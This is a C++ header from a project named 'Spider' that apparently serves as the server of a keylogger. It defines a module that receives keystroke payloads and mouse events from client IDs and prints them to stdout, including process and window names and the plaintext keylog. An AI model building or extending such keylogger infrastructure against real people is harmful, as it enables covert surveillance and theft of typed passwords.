//
// Created by hippolyteb on 11/8/16.
//

#ifndef SPIDER_SERVER_OUTPUTSTDINMODULE_HPP
#define SPIDER_SERVER_OUTPUTSTDINMODULE_HPP

#include <bits/unique_ptr.h>
#include <iostream>
#include "../Interfaces/ISpiderBusinessModule.hpp"
#include "../Interfaces/Event/ISpiderEventListener.hpp"
#include "../SpiderEventManager/SpiderEventListener.hpp"
#include "../SpiderEventManager/SpiderEventEmitter.hpp"
#include "../ProtoEnvelopes/Proto/SpiderKeyloggingPayload.pb.h"
#include "../ProtoEnvelopes/Proto/test.pb.h"
#include "../ProtoEnvelopes/Proto/SpiderMouseEvent.pb.h"

class OutputSTDOUTModule : public ISpiderBusinessModule {
    std::unique_ptr<ISpiderEventListener<SpiderKeyLoggingPayload>> _eventKeylogListener = std::unique_ptr<ISpiderEventListener<SpiderKeyLoggingPayload>>(new SpiderEventListener<SpiderKeyLoggingPayload>());
    std::unique_ptr<ISpiderEventListener<SpiderMouseEvent>> _eventMouseListener = std::unique_ptr<ISpiderEventListener<SpiderMouseEvent>>(new SpiderEventListener<SpiderMouseEvent>());
    std::unique_ptr<ISpiderEventListener<testPayload>> _eventTestListener = std::unique_ptr<ISpiderEventListener<testPayload>>(new SpiderEventListener<testPayload>());
    std::unique_ptr<ISpiderEventEmitter> _eventEmitter = std::unique_ptr<ISpiderEventEmitter>(new SpiderEventEmitter());
private:

public:
    OutputSTDOUTModule() {
        _eventKeylogListener->Register("SpiderKeyLoggingPayload", [&](std::string clientId, SpiderKeyLoggingPayload &payload) {
            std::cout << "[Keylogging from client with ID " << clientId << "]" << std::endl;
            if (payload.context().processname() != "" && payload.context().windowsname() != "")
                std::cout << "From context : [Process : " << payload.context().processname() << "; Windows : " << payload.context().windowsname() <<"]" << std::endl;
            if (payload.plaintextkeylog() != "")
                std::cout << "==> " << payload.plaintextkeylog() << std::endl;
            std::cout << "---------------------------------------------------" << std::endl;
        });

        _eventMouseListener->Register("SpiderMouseEvent", [&](std::string clientId, SpiderMouseEvent &payload) {
            std::cout << "[Mouse activity from client with ID " << clientId << "]" << std::endl;
            std::cout << "[TYPE : " << payload.type() << "] " << "X : " << payload.x() << " Y : " << payload.y() << std::endl;
            std::cout << "---------------------------------------------------" << std::endl;
        });

        _eventTestListener->Register("testPayload", [&](std::string clientId, testPayload &payload){
            std::cout << "testPayload : " << payload.content() << std::endl;
        });
    }
};

#endif //SPIDER_SERVER_OUTPUTSTDINMODULE_HPP
